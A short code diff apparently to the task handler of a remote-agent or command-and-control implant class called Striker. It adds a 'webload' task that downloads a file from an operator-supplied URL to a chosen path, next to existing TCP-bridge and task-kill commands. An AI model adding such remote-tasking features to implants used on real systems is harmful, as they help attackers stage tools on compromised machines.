@@ -226,6 +226,15 @@ class Striker:
       self.bridge(task, host1, port1, host2, port2)
       successful = 1
       result = "TCP bridge closed!"
+    elif (task["taskType"] == "webload"):
+      url = data["url"]
+      filename = data["file"]
+      try:
+        self.httpDownload(url, filename)
+        result = "File downloaded!"
+        successful = 1
+      except Exception as e:
+        result = "Download error: " + str(e)
     elif (task["taskType"] == "kill"):
       targetID = data["uid"]
       for tID in self.tasks:
